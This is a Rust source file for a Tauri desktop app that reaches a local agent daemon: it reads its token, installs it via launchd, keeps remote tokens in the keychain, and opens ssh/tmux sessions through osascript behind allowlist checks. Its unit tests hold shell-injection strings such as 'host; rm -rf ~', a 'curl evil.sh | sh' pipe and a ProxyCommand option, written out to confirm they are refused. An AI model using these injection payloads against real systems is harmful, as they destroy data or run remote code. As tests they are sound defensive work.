//! The desktop shell: a window, and the little that only a native process can
//! do.
//!
//! This process is strictly an API client. It never opens SQLite, never talks
//! to tmux or git, and never runs an agent. Closing it changes nothing about
//! running agents.
//!
//! What is native here is native by necessity, and all of it is about
//! *reaching* a daemon rather than doing its work: reading the bearer token
//! the local one wrote, running its `--install-launchd` when it is not
//! installed, keeping remote machines' tokens in the keychain, and opening a
//! terminal onto a session on another Mac. A webview can do none of them.

use std::path::{Path, PathBuf};
use std::process::{Command, Stdio};

/// Where the daemon keeps its state. Must match the daemon's own idea of it.
const STATE_DIR: &str = "Library/Application Support/rubick-forge";

/// The keychain service every remote machine's token is filed under. The
/// account is the machine's id, so one entry per machine.
const KEYCHAIN_SERVICE: &str = "tech.cloverly.rubick-forge";

/// Version of the app shell, surfaced to the frontend so the UI can show what
/// it is running next to the daemon version it talks to.
#[tauri::command]
fn app_version() -> &'static str {
    env!("CARGO_PKG_VERSION")
}

/// The local daemon's bearer token, if it has ever run.
///
/// Read rather than stored: the daemon owns it, and a copy in the app would be
/// one more place for it to go stale or leak.
#[tauri::command]
fn daemon_token() -> Result<String, String> {
    let path = state_dir()?.join("token");

    std::fs::read_to_string(&path)
        .map(|token| token.trim().to_owned())
        .map_err(|err| format!("cannot read {}: {err}", path.display()))
}

/// Install the daemon as a LaunchAgent by running its own subcommand.
///
/// The app never supervises the daemon; it asks the daemon to install itself
/// and launchd takes over from there.
///
/// The path comes from the webview, so it is checked before it is run: it must
/// identify itself as forge-daemon. Otherwise a bug in the page could turn
/// this into "run any binary on this machine".
#[tauri::command]
fn install_daemon(binary: String) -> Result<String, String> {
    let path = PathBuf::from(&binary);
    if !path.is_file() {
        return Err(format!("there is no daemon binary at {binary}"));
    }

    let version = ask_daemon(&path, "--version")?;
    if !version.starts_with("forge-daemon ") {
        return Err(format!("{binary} is not the Forge daemon"));
    }

    ask_daemon(&path, "--install-launchd")
}

/// Run one of the daemon's own subcommands and return what it said.
fn ask_daemon(path: &Path, argument: &str) -> Result<String, String> {
    let output = Command::new(path)
        .arg(argument)
        .stdin(Stdio::null())
        .output()
        .map_err(|err| format!("cannot run {}: {err}", path.display()))?;

    if output.status.success() {
        return Ok(String::from_utf8_lossy(&output.stdout).trim().to_owned());
    }

    Err(String::from_utf8_lossy(&output.stderr)
        .lines()
        .find(|line| !line.trim().is_empty())
        .unwrap_or("the daemon would not say why it failed")
        .to_owned())
}

/// One machine's keychain entry.
///
/// A remote token never touches the app's own config: the machines list is
/// plain enough to paste into a bug report, and the secrets are not in it.
fn keychain(machine: &str) -> Result<keyring::Entry, String> {
    if machine.trim().is_empty() {
        return Err("a machine needs an id before it can have a token".to_owned());
    }

    keyring::Entry::new(KEYCHAIN_SERVICE, machine)
        .map_err(|err| format!("cannot reach the keychain: {err}"))
}

/// A remote machine's bearer token, or `None` if none has been stored.
#[tauri::command]
fn machine_token(machine: String) -> Result<Option<String>, String> {
    match keychain(&machine)?.get_password() {
        Ok(token) => Ok(Some(token)),
        Err(keyring::Error::NoEntry) => Ok(None),
        Err(err) => Err(format!("cannot read the token for {machine}: {err}")),
    }
}

#[tauri::command]
fn set_machine_token(machine: String, token: String) -> Result<(), String> {
    keychain(&machine)?
        .set_password(&token)
        .map_err(|err| format!("cannot save the token for {machine}: {err}"))
}

/// Forget a machine's token. Removing a machine that never had one is fine.
#[tauri::command]
fn forget_machine_token(machine: String) -> Result<(), String> {
    match keychain(&machine)?.delete_credential() {
        Ok(()) | Err(keyring::Error::NoEntry) => Ok(()),
        Err(err) => Err(format!("cannot forget the token for {machine}: {err}")),
    }
}

/// A word that cannot become anything but itself on a command line.
///
/// The leading `-` matters as much as the quoting characters: `-v` as a
/// destination is an ssh *option*, which would shift `-t` and `tmux` along into
/// the slots after it.
fn is_plain_word(part: &str) -> bool {
    !part.is_empty()
        && !part.starts_with('-')
        && part
            .chars()
            .all(|c| c.is_ascii_alphanumeric() || matches!(c, '.' | '-' | '_'))
}

/// An ssh destination: `host`, `user@host`, or a `~/.ssh/config` alias.
fn is_ssh_host(host: &str) -> bool {
    match host.split_once('@') {
        Some((user, hostname)) => is_plain_word(user) && is_plain_word(hostname),
        None => is_plain_word(host),
    }
}

/// A tmux session name safe to name on a command line.
///
/// Shape, not vocabulary: the name comes from the daemon's own session record,
/// and what this crate has to guarantee is that it cannot turn into a second
/// command or an ssh flag. Which names the daemon gives its sessions is the
/// daemon's business, and hard-coding its prefix here would put a fact about
/// tmux in the one crate that is supposed to know nothing about tmux.
fn is_safe_session(name: &str) -> bool {
    is_plain_word(name)
}

/// Open Terminal on a session running on another Mac (SPEC D18).
///
/// ssh is not a transport here — the app talks to every daemon over HTTP. This
/// is the escape hatch: a real terminal, attached the same way the user would
/// attach it by hand.
///
/// Both arguments end up inside a string Terminal runs as a shell command, so
/// both are checked against what they are allowed to be rather than escaped.
/// A destination that does not look like a host is refused, not quoted.
#[tauri::command]
fn open_ssh_session(host: String, tmux_name: String) -> Result<(), String> {
    if !is_ssh_host(&host) {
        return Err(format!("{host} is not a usable ssh destination"));
    }
    if !is_safe_session(&tmux_name) {
        return Err(format!("{tmux_name} is not a usable session name"));
    }

    let script = format!(
        r#"tell application "Terminal"
            activate
            do script "ssh {host} -t tmux attach -t {tmux_name}"
        end tell"#
    );

    let output = Command::new("/usr/bin/osascript")
        .arg("-e")
        .arg(&script)
        .stdin(Stdio::null())
        .output()
        .map_err(|err| format!("cannot open Terminal: {err}"))?;

    if output.status.success() {
        return Ok(());
    }

    Err(String::from_utf8_lossy(&output.stderr)
        .lines()
        .find(|line| !line.trim().is_empty())
        .unwrap_or("Terminal would not say why it refused")
        .to_owned())
}

fn state_dir() -> Result<PathBuf, String> {
    if let Some(overridden) = std::env::var_os("FORGE_STATE_DIR") {
        return Ok(PathBuf::from(overridden));
    }

    std::env::var_os("HOME")
        .map(|home| PathBuf::from(home).join(STATE_DIR))
        .ok_or_else(|| "HOME is not set, so the daemon's state cannot be found".to_owned())
}

#[cfg_attr(mobile, tauri::mobile_entry_point)]
pub fn run() {
    tauri::Builder::default()
        .plugin(tauri_plugin_dialog::init())
        .plugin(tauri_plugin_notification::init())
        .plugin(tauri_plugin_opener::init())
        .invoke_handler(tauri::generate_handler![
            app_version,
            daemon_token,
            install_daemon,
            machine_token,
            set_machine_token,
            forget_machine_token,
            open_ssh_session
        ])
        .run(tauri::generate_context!())
        .expect("error while running rubick-forge");
}

#[cfg(test)]
mod tests {
    use super::*;

    #[test]
    fn app_version_is_the_crate_version() {
        assert_eq!(app_version(), env!("CARGO_PKG_VERSION"));
    }

    #[test]
    fn installing_needs_a_binary_that_is_there() {
        let err = install_daemon("/definitely/not/here".to_owned()).unwrap_err();

        assert!(err.contains("no daemon binary"), "{err}");
    }

    #[test]
    fn installing_refuses_anything_that_is_not_the_daemon() {
        // A real, runnable binary that is not ours.
        let err = install_daemon("/bin/echo".to_owned()).unwrap_err();

        assert!(err.contains("not the Forge daemon"), "{err}");
    }

    #[test]
    fn an_ssh_destination_is_a_host_and_nothing_more() {
        assert!(is_ssh_host("mac-mini"));
        assert!(is_ssh_host("mac-mini.tail1234.ts.net"));
        assert!(is_ssh_host("ryan@mac-mini"));
        assert!(is_ssh_host("100.101.102.103"));
    }

    #[test]
    fn anything_that_could_run_a_second_command_is_refused() {
        // Every one of these would be a shell injection inside Terminal's
        // `do script`, which is why the check is an allowlist.
        assert!(!is_ssh_host("host; rm -rf ~"));
        assert!(!is_ssh_host("host\" && curl evil.sh | sh; \""));
        assert!(!is_ssh_host("$(whoami)"));
        assert!(!is_ssh_host("host`id`"));
        assert!(!is_ssh_host("host with spaces"));
        assert!(!is_ssh_host(""));
        assert!(!is_ssh_host("@host"));
        assert!(!is_ssh_host("user@"));
    }

    #[test]
    fn a_session_name_cannot_become_a_second_command() {
        assert!(is_safe_session("forge-1"));
        assert!(is_safe_session("forge-42"));
        assert!(!is_safe_session("forge-1; rm -rf ~"));
        assert!(!is_safe_session("forge 1"));
        assert!(!is_safe_session(""));
    }

    #[test]
    fn a_destination_starting_with_a_dash_is_an_ssh_option_not_a_host() {
        // `ssh -v -t tmux attach -t forge-1` would run `tmux` as the host.
        assert!(!is_ssh_host("-v"));
        assert!(!is_ssh_host("-4"));
        assert!(!is_ssh_host("-oProxyCommand=evil"));
        assert!(!is_safe_session("-L8080:localhost:22"));
    }

    #[test]
    fn opening_a_terminal_refuses_a_hostile_destination() {
        let err = open_ssh_session("host; rm -rf ~".to_owned(), "forge-1".to_owned()).unwrap_err();
        assert!(err.contains("not a usable ssh destination"), "{err}");

        let err = open_ssh_session("mac-mini".to_owned(), "bash -c evil".to_owned()).unwrap_err();
        assert!(err.contains("not a usable session name"), "{err}");
    }

    #[test]
    fn a_machine_needs_an_id_to_have_a_token() {
        assert!(machine_token("  ".to_owned()).is_err());
        assert!(set_machine_token(String::new(), "t".to_owned()).is_err());
    }

    #[test]
    fn a_missing_token_says_which_file_is_missing() {
        // The override is what the daemon itself honours, so the app follows
        // it rather than guessing.
        let temp = tempfile::tempdir().unwrap();
        unsafe { std::env::set_var("FORGE_STATE_DIR", temp.path()) };

        let err = daemon_token().unwrap_err();
        assert!(err.contains("token"), "{err}");

        std::fs::write(temp.path().join("token"), "abc123\n").unwrap();
        assert_eq!(daemon_token().unwrap(), "abc123");

        unsafe { std::env::remove_var("FORGE_STATE_DIR") };
    }
}
